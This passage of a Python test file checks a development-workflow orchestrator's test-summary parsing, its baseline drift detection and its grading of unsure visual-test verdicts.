    def test_the_test_stage_pauses_deps_missing(self):
        h = T9.Harness(self, fixture(), suites=[suite(RAW_227_012, passed=False, rc=1)])
        self.assertEqual(T.run(h.p).token(), "OK PAUSE: needs-human — engine-env-deps-missing")

    def test_execute_reads_commands_test_summary(self):
        from _k3 import XCFG, XHarness, dev
        from workflows.dev.stages import execute as X
        cfg = dict(XCFG, commands=dict(XCFG["commands"], test_summary={"passed_re": r"^OKAY (\d+)$",
                                                                        "failed_re": r"^BAD (\d+)$"}))
        from test_k3_execute_stage import TL_DONE
        from _k3 import auditor
        h = XHarness(self, roles=[dev(), TL_DONE, auditor()], suites=[suite("custom runner\nOKAY 12\nBAD 0\n")] * 4,
                     config=cfg)
        self.assertEqual(X.run(h.p, "implement").token(), "OK ADVANCE: test")


# ---- 8 (#227 D): the turbo output ------------------------------------------------------------------------------------

class D227Turbo(unittest.TestCase):
    def test_the_measured_output_is_1548_green(self):
        s = CH.parse_summary(TURBO_227)
        self.assertEqual((s.runner, s.passed, s.failed, s.green), ("vitest", 1548, 0, True))

    def test_one_package_failing_is_red_with_its_name(self):
        raw = TURBO_227.replace("@visa/lib:test: \x1b[2m      Tests \x1b[22m \x1b[1m\x1b[32m51 passed\x1b[39m\x1b[22m"
                                "\x1b[90m (51)\x1b[39m",
                                "@visa/lib:test:  \x1b[31m×\x1b[39m useTermsDialog > opens the dialog\n"
                                "@visa/lib:test: \x1b[2m      Tests \x1b[22m \x1b[1m\x1b[31m1 failed\x1b[39m\x1b[22m"
                                " | \x1b[1m\x1b[32m50 passed\x1b[39m\x1b[22m\x1b[90m (51)\x1b[39m")
        self.assertNotEqual(raw, TURBO_227)
        raw = raw.replace(" Tasks:    6 successful, 6 total", " Tasks:    5 successful, 6 total\n"
                          "Failed:    @visa/lib#test")
        s = CH.parse_summary(raw)
        self.assertFalse(s.green)
        self.assertEqual((s.passed, s.failed), (1547, 1))
        self.assertIn("useTermsDialog > opens the dialog", s.failed_names)
        self.assertIn("@visa/lib#test", s.failed_names)

    def test_a_package_failing_before_its_summary_is_red(self):
        cut = TURBO_227.split("@visa/gas:test: ")[0] + "\n Tasks:    5 successful, 6 total\nFailed:    @visa/gas#test\n"
        s = CH.parse_summary(cut)
        self.assertFalse(s.green)
        self.assertIn("@visa/gas#test", s.failed_names)

    def test_turbo_summary_alone(self):
        s = CH.parse_summary("turbo 2.6.0\n Tasks:    3 successful, 3 total\n")
        self.assertEqual((s.runner, s.passed, s.green), ("turbo", 3, True))

    def test_no_turbo_no_prefix_stripping(self):
        raw = "INFO:root: Tests  2 passed (2)\n"
        self.assertEqual(CH.normalize_output(raw), raw)
        self.assertIsNone(CH.parse_summary("INFO:root: something\n"))
        two = "Tests  3 passed (3)\nTests  1 failed | 2 passed (3)\n"
        s = CH.parse_summary(two)
        self.assertEqual((s.passed, s.failed), (5, 1))


# ---- + one-man-company #687 on 0.102.14: the single-role path re-takes a format-only baseline ------------------------

class R687SingleRoleFormat(unittest.TestCase):
    DONE = ">>> RESULT <<<\nDONE: ok"

    def _runner(self, j):
        return RR.Runner(journal=j, parent_env={"PATH": os.environ["PATH"]},
                         spawn=FakeSpawn([{"stream": stream_lines(texts=[self.DONE])}] * 3),
                         user_settings=os.path.join(self.u, "u"), run_root_dir=os.path.join(self.u, "runs"),
                         claude="claude", clock=Clock())

    def _spec(self):
        return RR.RoleSpec("developer", "implement", "t", issue=1, stage="s", step="x", worktree=self.wt,
                           model="sonnet", base="main", branch="fix/1", remote_check=False)

    def setUp(self):
        self.wt = repo(self, {"lib/a.dart": "a\n"})
        git(self.wt, "switch", "-q", "-c", "fix/1")
        self.u = tmpdir(self)
        self.assertEqual(self._runner(T13_EvJournal()).run_role(self._spec()).status, "DONE")
        self.path = RR.Runner._baseline_path(self._runner(T13_EvJournal()), self.wt, 1)

    def _age(self):
        b = json.load(open(self.path))
        b.pop("integrity_format", None)
        for k in b["integrity"]:
            if k.startswith(("git config --local", "config file ")):
                b["integrity"][k] = "0" * 40
        json.dump(b, open(self.path, "w"))

    def test_r687_a_format_only_baseline_is_retaken_on_the_role_path(self):
        self._age()
        j = T13_EvJournal()
        res = self._runner(j).run_role(self._spec())
        self.assertEqual(res.status, "DONE", res.line)
        ev = [e for e in j.events if e.get("what") == "rebaseline-format"]
        self.assertEqual(len(ev), 1)
        self.assertTrue(all(x.startswith(("git config ", "config file ")) for x in ev[0]["items"]))

    def test_a_real_change_is_still_drift_on_the_role_path(self):
        self._age()
        _w(os.path.join(self.wt, "lib/a.dart"), "a person's edit\n")
        res = self._runner(T13_EvJournal()).run_role(self._spec())
        self.assertEqual(res.status, "DRIFT")


class T13_EvJournal(RecJournal):
    def __init__(self):
        RecJournal.__init__(self)
        self.events = []

    def append(self, kind, **f):
        self.events.append(dict(f, kind=kind))


# ---- + word_app #1797 on 0.102.13: a visual row the judge is unsure of is no loop-back --------------------------------

class R1797VisualUnsure(unittest.TestCase):
    TC = ("## 케이스\n- C1 — AC #1: a\n\n<!-- guild:visual-cases -->\n| 화면 | 상태 | AC |\n|---|---|---|\n"
          "| 설정 | quiz_type_single | AC #1 |\n| 설정 | quiz_type_all | AC #1 |\n| 설정 | quiz_type_count_dark | AC #1 |\n")

    def _run(self, verdicts, overall="gap"):
        covers = [{"test": "test/a_test.dart::t", "ac": "C1", "kind": "new"}]
        rows = [{"row": n, "verdict": v} for n, v in verdicts]
        j = decision(overall, {"ac": [{"id": "AC #1", "covered_by": ["test/a_test.dart::t"], "verdict": "effective",
                                       "why": "w"}], "visual_rows": rows, "overall": overall,
                               "security_concern": False})
        roles = [role("DONE", covers=covers, e2e="E2E 불요"), role("DONE", covers=covers)]
        h = T9.Harness(self, fixture(), roles=roles, judges={"TEST": [j, j]}, suites=[T9.suite(T9.FLUTTER_GREEN)])
        h.write_file("docs/specs/7/test-cases.md", self.TC)
        h.write_file("test/a_test.dart", T9.TESTFILE)
        return h, T.run(h.p)

    def test_r1797_unsure_rows_are_covered_and_graded(self):
        h, r = self._run([("quiz_type_all", "unsure"), ("quiz_type_count_dark", "unsure"),
                          ("quiz_type_single", "unsure")])
        self.assertNotEqual(r.token(), "OK LOOPBACK: execute")
        rows = _code_blocks(h, "visual-unsure")
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0].get("visual_unsure"), "quiz_type_all,quiz_type_count_dark,quiz_type_single")
        self.assertEqual(rows[0].get("grade"), "trigger")

    def test_an_uncovered_row_is_still_a_gap(self):
        _h, r = self._run([("quiz_type_all", "unsure"), ("quiz_type_single", "uncovered")])
        self.assertEqual(r.token(), "OK LOOPBACK: execute")


if __name__ == "__main__":
    unittest.main()
